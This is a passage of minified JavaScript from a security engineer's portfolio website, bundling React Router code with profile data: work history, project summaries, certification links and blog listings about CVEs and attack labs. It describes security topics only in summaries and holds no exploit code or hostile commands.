e&&y?Q.createElement(Ql.Provider,{value:{location:Ba({pathname:"/",search:"",hash:"",state:null,key:"default"},p),navigationType:$i.Pop}},y):y}function _S(){let t=TS(),e=uS(t)?t.status+" "+t.statusText:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,s={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return Q.createElement(Q.Fragment,null,Q.createElement("h2",null,"Unexpected Application Error!"),Q.createElement("h3",{style:{fontStyle:"italic"}},e),n?Q.createElement("pre",{style:s},n):null,null)}const xS=Q.createElement(_S,null);class yS extends Q.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,n){return n.location!==e.location||n.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:n.error,location:n.location,revalidation:e.revalidation||n.revalidation}}componentDidCatch(e,n){console.error("React Router caught the following error during render",e,n)}render(){return this.state.error!==void 0?Q.createElement(ps.Provider,{value:this.props.routeContext},Q.createElement(c0.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function SS(t){let{routeContext:e,match:n,children:i}=t,s=Q.useContext(Jp);return s&&s.static&&s.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(s.staticContext._deepestRenderedBoundaryId=n.route.id),Q.createElement(ps.Provider,{value:e},i)}function bS(t,e,n,i){var s;if(e===void 0&&(e=[]),n===void 0&&(n=null),i===void 0&&(i=null),t==null){var r;if(!n)return null;if(n.errors)t=n.matches;else if((r=i)!=null&&r.v7_partialHydration&&e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let a=t,o=(s=n)==null?void 0:s.errors;if(o!=null){let p=a.findIndex(d=>d.route.id&&(o==null?void 0:o[d.route.id])!==void 0);p>=0||Ct(!1),a=a.slice(0,Math.min(a.length,p+1))}let l=!1,c=-1;if(n&&i&&i.v7_partialHydration)for(let p=0;p<a.length;p++){let d=a[p];if((d.route.HydrateFallback||d.route.hydrateFallbackElement)&&(c=p),d.route.id){let{loaderData:h,errors:f}=n,v=d.route.loader&&h[d.route.id]===void 0&&(!f||f[d.route.id]===void 0);if(d.route.lazy||v){l=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((p,d,h)=>{let f,v=!1,y=null,m=null;n&&(f=o&&d.route.id?o[d.route.id]:void 0,y=d.route.errorElement||xS,l&&(c<0&&h===0?(CS("route-fallback"),v=!0,m=null):c===h&&(v=!0,m=d.route.hydrateFallbackElement||null)));let u=e.concat(a.slice(0,h+1)),g=()=>{let _;return f?_=y:v?_=m:d.route.Component?_=Q.createElement(d.route.Component,null):d.route.element?_=d.route.element:_=p,Q.createElement(SS,{match:d,routeContext:{outlet:p,matches:u,isDataRoute:n!=null},children:_})};return n&&(d.route.ErrorBoundary||d.route.errorElement||h===0)?Q.createElement(yS,{location:n.location,revalidation:n.revalidation,component:y,error:f,children:g(),routeContext:{outlet:null,matches:u,isDataRoute:!0}}):g()},null)}var h0=function(t){return t.UseBlocker="useBlocker",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t}(h0||{}),f0=function(t){return t.UseBlocker="useBlocker",t.UseLoaderData="useLoaderData",t.UseActionData="useActionData",t.UseRouteError="useRouteError",t.UseNavigation="useNavigation",t.UseRouteLoaderData="useRouteLoaderData",t.UseMatches="useMatches",t.UseRevalidator="useRevalidator",t.UseNavigateStable="useNavigate",t.UseRouteId="useRouteId",t}(f0||{});function wS(t){let e=Q.useContext(Jp);return e||Ct(!1),e}function ES(t){let e=Q.useContext(pS);return e||Ct(!1),e}function MS(t){let e=Q.useContext(ps);return e||Ct(!1),e}function m0(t){let e=MS(),n=e.matches[e.matches.length-1];return n.route.id||Ct(!1),n.route.id}function TS(){var t;let e=Q.useContext(c0),n=ES(),i=m0();return e!==void 0?e:(t=n.errors)==null?void 0:t[i]}function AS(){let{router:t}=wS(h0.UseNavigateStable),e=m0(f0.UseNavigateStable),n=Q.useRef(!1);return u0(()=>{n.current=!0}),Q.useCallback(function(s,r){r===void 0&&(r={}),n.current&&(typeof s=="number"?t.navigate(s):t.navigate(s,Ba({fromRouteId:e},r)))},[t,e])}const Ff={};function CS(t,e,n){Ff[t]||(Ff[t]=!0)}function RS(t,e){t==null||t.v7_startTransition,t==null||t.v7_relativeSplatPath}function Vi(t){Ct(!1)}function PS(t){let{basename:e="/",children:n=null,location:i,navigationType:s=$i.Pop,navigator:r,static:a=!1,future:o}=t;Za()&&Ct(!1);let l=e.replace(/^\/*/,"/"),c=Q.useMemo(()=>({basename:l,navigator:r,static:a,future:Ba({v7_relativeSplatPath:!1},o)}),[l,o,r,a]);typeof i=="string"&&(i=zr(i));let{pathname:p="/",search:d="",hash:h="",state:f=null,key:v="default"}=i,y=Q.useMemo(()=>{let m=Zp(p,l);return m==null?null:{location:{pathname:m,search:d,hash:h,state:f,key:v},navigationType:s}},[l,p,d,h,f,v,s]);return y==null?null:Q.createElement(Vs.Provider,{value:c},Q.createElement(Ql.Provider,{children:n,value:y}))}function kS(t){let{children:e,location:n}=t;return gS(ad(e),n)}new Promise(()=>{});function ad(t,e){e===void 0&&(e=[]);let n=[];return Q.Children.forEach(t,(i,s)=>{if(!Q.isValidElement(i))return;let r=[...e,s];if(i.type===Q.Fragment){n.push.apply(n,ad(i.props.children,r));return}i.type!==Vi&&Ct(!1),!i.props.index||!i.props.children||Ct(!1);let a={id:i.props.id||r.join("-"),caseSensitive:i.props.caseSensitive,element:i.props.element,Component:i.props.Component,index:i.props.index,path:i.props.path,loader:i.props.loader,action:i.props.action,errorElement:i.props.errorElement,ErrorBoundary:i.props.ErrorBoundary,hasErrorBoundary:i.props.ErrorBoundary!=null||i.props.errorElement!=null,shouldRevalidate:i.props.shouldRevalidate,handle:i.props.handle,lazy:i.props.lazy};i.props.children&&(a.children=ad(i.props.children,r)),n.push(a)}),n}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function od(){return od=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t},od.apply(this,arguments)}function LS(t,e){if(t==null)return{};var n={},i=Object.keys(t),s,r;for(r=0;r<i.length;r++)s=i[r],!(e.indexOf(s)>=0)&&(n[s]=t[s]);return n}function NS(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function IS(t,e){return t.button===0&&(!e||e==="_self")&&!NS(t)}const DS=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],US="6";try{window.__reactRouterVersion=US}catch{}const OS="startTransition",Bf=A_[OS];function FS(t){let{basename:e,children:n,future:i,window:s}=t,r=Q.useRef();r.current==null&&(r.current=By({window:s,v5Compat:!0}));let a=r.current,[o,l]=Q.useState({action:a.action,location:a.location}),{v7_startTransition:c}=i||{},p=Q.useCallback(d=>{c&&Bf?Bf(()=>l(d)):l(d)},[l,c]);return Q.useLayoutEffect(()=>a.listen(p),[a,p]),Q.useEffect(()=>RS(i),[i]),Q.createElement(PS,{basename:e,children:n,location:o.location,navigationType:o.action,navigator:a,future:i})}const BS=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",zS=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ft=Q.forwardRef(function(e,n){let{onClick:i,relative:s,reloadDocument:r,replace:a,state:o,target:l,to:c,preventScrollReset:p,viewTransition:d}=e,h=LS(e,DS),{basename:f}=Q.useContext(Vs),v,y=!1;if(typeof c=="string"&&zS.test(c)&&(v=c,BS))try{let _=new URL(window.location.href),b=c.startsWith("//")?new URL(_.protocol+c):new URL(c),T=Zp(b.pathname,f);b.origin===_.origin&&T!=null?c=T+b.search+b.hash:y=!0}catch{}let m=hS(c,{relative:s}),u=VS(c,{replace:a,state:o,target:l,preventScrollReset:p,relative:s,viewTransition:d});function g(_){i&&i(_),_.defaultPrevented||u(_)}return Q.createElement("a",od({},h,{href:v||m,onClick:y||r?i:g,ref:n,target:l}))});var zf;(function(t){t.UseScrollRestoration="useScrollRestoration",t.UseSubmit="useSubmit",t.UseSubmitFetcher="useSubmitFetcher",t.UseFetcher="useFetcher",t.useViewTransitionState="useViewTransitionState"})(zf||(zf={}));var Vf;(function(t){t.UseFetcher="useFetcher",t.UseFetchers="useFetchers",t.UseScrollRestoration="useScrollRestoration"})(Vf||(Vf={}));function VS(t,e){let{target:n,replace:i,state:s,preventScrollReset:r,relative:a,viewTransition:o}=e===void 0?{}:e,l=d0(),c=Ja(),p=p0(t,{relative:a});return Q.useCallback(d=>{if(IS(d,n)){d.preventDefault();let h=i!==void 0?i:Ll(c)===Ll(p);l(t,{replace:h,state:s,preventScrollReset:r,relative:a,viewTransition:o})}},[c,l,p,i,s,n,t,r,a,o])}function HS({onToggleTheme:t,theme:e}){const n=Ja(),i=d0(),[s,r]=Q.useState(!1),a=(c,p)=>{c.preventDefault();const d=()=>{const h=document.getElementById(p);h&&h.scrollIntoView({behavior:"smooth",block:"start"})};n.pathname!=="/"?(i("/"),setTimeout(d,120)):d(),r(!1)},o=[{label:"About",anchor:"about"},{label:"Experience",anchor:"experience"},{label:"Projects",to:"/projects"},{label:"Certs",to:"/certifications"},{label:"Blog",to:"/blogs"},{label:"CVE Map",to:"/cve-map"},{label:"Contact",anchor:"contact"}],l=c=>n.pathname===c;return S.jsxs(S.Fragment,{children:[S.jsx("nav",{className:"hud",children:S.jsxs("div",{className:"container hud-inner",children:[S.jsx(Ft,{to:"/",className:"hud-brand",children:"Hem Parekh"}),S.jsx("div",{className:"hud-links",children:o.map(c=>c.anchor?S.jsxs("a",{href:`#${c.anchor}`,className:"hud-link",onClick:p=>a(p,c.anchor),children:[S.jsx("span",{children:c.label}),S.jsx("div",{className:"link-track",children:S.jsx("div",{className:"link-track-fill"})})]},c.label):S.jsxs(Ft,{to:c.to,className:`hud-link ${l(c.to)?"active":""}`,onClick:()=>r(!1),children:[S.jsx("span",{children:c.label}),S.jsx("div",{className:"link-track",children:S.jsx("div",{className:"link-track-fill"})})]},c.label))}),S.jsxs("div",{className:"hud-actions",children:[S.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:t,type:"button",children:["Theme ",e==="dark"?"Light":"Dark"]}),S.jsxs("button",{className:`menu-toggle ${s?"open":""}`,type:"button",onClick:()=>r(c=>!c),"aria-expanded":s,"aria-controls":"hud-menu",children:[S.jsxs("span",{className:"menu-toggle-lines","aria-hidden":"true",children:[S.jsx("span",{className:"menu-line"}),S.jsx("span",{className:"menu-line"}),S.jsx("span",{className:"menu-line"})]}),S.jsx("span",{className:"menu-label",children:"Menu"})]})]})]})}),S.jsx("div",{className:`hud-menu ${s?"open":""}`,id:"hud-menu","aria-hidden":!s,children:S.jsxs("div",{className:"hud-menu-list",children:[o.map(c=>c.anchor?S.jsxs("a",{href:`#${c.anchor}`,className:"menu-link",onClick:p=>a(p,c.anchor),children:[S.jsx("span",{children:c.label}),S.jsx("div",{className:"link-track",children:S.jsx("div",{className:"link-track-fill"})})]},c.label):S.jsxs(Ft,{to:c.to,className:"menu-link",onClick:()=>r(!1),children:[S.jsx("span",{children:c.label}),S.jsx("div",{className:"link-track",children:S.jsx("div",{className:"link-track-fill"})})]},c.label)),S.jsx("button",{className:"btn",type:"button",onClick:()=>r(!1),children:"Close"})]})})]})}const ld=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],GS={title:"Hello, I'm Hem Parekh.",highlight:"Hem Parekh",image:"/images/heading_image.webp",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Hf={title:"ABOUT ME",image:"/images/profile.jpeg",text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},WS=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],g0=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],v0=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],jS={title:"Ops Log // Latest Signals",subtitle:"Field notes from exploit labs, CVE hunts, and defensive experiments.",social:[{href:"#",icon:"fab fa-twitter"},{href:"#",icon:"fab fa-linkedin-in"},{href:"#",icon:"fab fa-github"},{href:"#",icon:"fab fa-instagram"}]},za=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function XS(){return S.jsx("footer",{className:"footer",children:S.jsxs("div",{className:"container footer-grid",children:[S.jsxs("div",{children:[S.jsx("h4",{children:"Sitemap"}),S.jsx(Ft,{to:"/",children:"Home"}),S.jsx("br",{}),S.jsx(Ft,{to:"/projects",children:"Projects"}),S.jsx("br",{}),S.jsx(Ft,{to:"/certifications",children:"Certifications"}),S.jsx("br",{}),S.jsx(Ft,{to:"/blogs",children:"Blog"}),S.jsx("br",{}),S.jsx(Ft,{to:"/cve-map",children:"CVE Map"})]}),S.jsxs("div",{children:[S.jsx("h4",{children:"Connect"}),ld.map(t=>S.jsx("div",{children:S.jsx("a",{href:t.href,target:"_blank",rel:"noreferrer",children:t.label})},t.href))]})]})})}function qS({links:t=[]}){return S.jsx("div",{className:"social-icons",children:t.map(e=>S.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer","aria-label":e.label||"Social link",children:S.jsx("i",{className:e.icon})},e.href))})}function _0(t=.15){const e=Q.useRef(null),[n,i]=Q.useState(!1);return Q.useEffect(()=>{const s=e.current;if(!s)return;const r=new IntersectionObserver(([a])=>{a.isIntersecting&&(i(!0),r.unobserve(a.target))},{threshold:t});return r.observe(s),()=>r.disconnect()},[t]),[e,n]}function YS({data:t,socials:e}){const[n,i]=_0();return S.jsx("section",{className:`section about reveal ${i?"visible":""}`,id:"about",ref:n,children:S.jsxs("div",{className:"container about-grid",children:[S.jsxs("div",{className:"about-copy",children:[S.jsx("div",{className:"eyebrow",children:"About"}),S.jsx("h2",{className:"section-title",children:t.title}),S.jsx("p",{className:"lead",children:t.text}),S.jsx(qS,{links:e})]}),S.jsx("div",{className:"about-media",children:S.jsx("img",{src:t.image,alt:t.title})})]})})}function x0({posts:t=[],page:e=1,totalPages:n=1,onPageChange:i,wrap:s=!0}){const r=S.jsxs(S.Fragment,{children:[t.map(a=>S.jsxs("article",{className:"blog-row",children:[S.jsxs("div",{className:"blog-row-meta",children:[S.jsx("div",{className:"blog-row-date",children:a.date}),S.jsx("div",{className:"blog-row-time",children:a.readTime})]}),S.jsxs("div",{className:"blog-row-body",children:[S.jsx(Ft,{to:a.href,className:"blog-row-title",children:a.title}),S.jsx("p",{className:"blog-row-excerpt",children:a.excerpt}),S.jsx("div",{className:"blog-tags",children:S.jsx("span",{className:"pill",children:"Security"})})]}),S.jsx("div",{className:"blog-row-cta",children:S.jsx(Ft,{to:a.href,className:"view-credentials",children:"Read"})})]},a.title)),n>1&&S.jsxs("div",{className:"blog-pagination",children:[S.jsx("button",{className:"pill",disabled:e===1,onClick:()=>i==null?void 0:i(Math.max(1,e-1)),type:"button",children:"Previous"}),S.jsxs("span",{className:"blog-page-indicator",children:["Page ",e," of ",n]}),S.jsx("button",{className:"pill",disabled:e===n,onClick:()=>i==null?void 0:i(Math.min(n,e+1)),type:"button",children:"Next"})]})]});return s?S.jsx("section",{className:"blog-list-section",children:S.jsx("div",{className:"container blog-list",children:r})}):S.jsx("div",{className:"blog-list",children:r})}function $S({issuer:t="Cert"}){var n;const e=((n=t==null?void 0:t[0])==null?void 0:n.toUpperCase())||"C";return S.jsx("div",{className:"cert-badge",children:e})}const KS=["All","Security","Cloud","Networking"];function y0({items:t=[],showViewAll:e=!1,showHeader:n=!0,wrap:i=!0}){const[s,r]=Q.useState("All"),[a,o]=Q.useState(1),l=5,c=Q.useMemo(()=>s==="All"?t:t.filter(v=>v.domain?v.domain===s:!0),[s,t]),p=Math.max(1,Math.ceil(c.length/l)),d=c.slice((a-1)*l,a*l),h=v=>{r(v),o(1)},f=S.jsxs(S.Fragment,{children:[n&&S.jsxs("div",{className:"section-header",children:[S.jsx("div",{children:S.jsx("h2",{className:"section-title",children:"Certifications"})}),e&&S.jsx("div",{className:"section-actions",children:S.jsx(Ft,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),n&&S.jsx("div",{className:"filter-chips",children:KS.map(v=>S.jsx("button",{className:`chip ${v===s?"active":""}`,type:"button",onClick:()=>h(v),children:v},v))}),S.jsx("div",{className:"cert-list",children:d.map(v=>S.jsxs("div",{className:"cert-row",children:[S.jsxs("div",{className:"cert-row-meta",children:[S.jsx("div",{className:"cert-row-badge",children:S.jsx($S,{issuer:v.issuer})}),S.jsxs("div",{className:"cert-row-tags",children:[S.jsx("span",{className:"pill",children:v.domain}),S.jsx("span",{className:"pill",children:v.issuer})]})]}),S.jsxs("div",{className:"cert-row-body",children:[S.jsx("div",{className:"cert-row-title",children:v.title}),S.jsx("p",{className:"cert-row-details",children:v.details})]}),S.jsx("div",{className:"cert-row-cta",children:S.jsx("a",{href:v.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View"})})]},v.title))}),p>1&&S.jsxs("div",{className:"blog-pagination project-pagination",children:[S.jsx("button",{className:"pill",disabled:a===1,onClick:()=>o(Math.max(1,a-1)),type:"button",children:"Previous"}),S.jsxs("span",{className:"blog-page-indicator",children:["Page ",a," of ",p]}),S.jsx("button",{className:"pill",disabled:a===p,onClick:()=>o(Math.min(p,a+1)),type:"button",children:"Next"})]})]});return i?S.jsx("section",{className:"section certifications",id:"certs",children:S.jsx("div",{className:"container",children:f})}):S.jsx("div",{className:"certifications",children:f})}function ZS({data:t}){const[e,n]=_0();return S.jsx("header",{className:`hero reveal ${n?"visible":""}`,id:"home",ref:e,children:S.jsxs("div",{className:"container hero-grid",children:[S.jsxs("div",{className:"hero-copy",children:[S.jsx("div",{className:"eyebrow",children:"Security engineer // pen tester"}),S.jsxs("div",{className:"hero-lines mbm",children:[S.jsx("h1",{className:"hero-display",children:"A different"}),S.jsx("h1",{className:"hero-display",children:"security"}),S.jsx("h1",{className:"hero-display",children:"approach"})]}),S.jsx("p",{className:"hero-lead",children:t.blurb}),S.jsxs("div",{className:"hero-actions",children:[S.jsx(Ft,{className:"button primary",to:"/projects",children:"View Projects"}),S.jsx(Ft,{className:"button ghost",to:"/certifications",children:"View Certifications"})]}),S.jsxs("div",{className:"hero-meta",children:[S.jsx("span",{className:"pill",children:"Threat Hunting"}),S.jsx("span",{className:"pill",children:"Application Security"}),S.jsx("span",{className:"pill",children:"Privacy"})]})]}),S.jsx("div",{className:"hero-visual",children:S.jsx("div",{className:"hero-image-frame",children:S.jsx("img",{src:t.image,alt:t.highlight})})})]})})}const 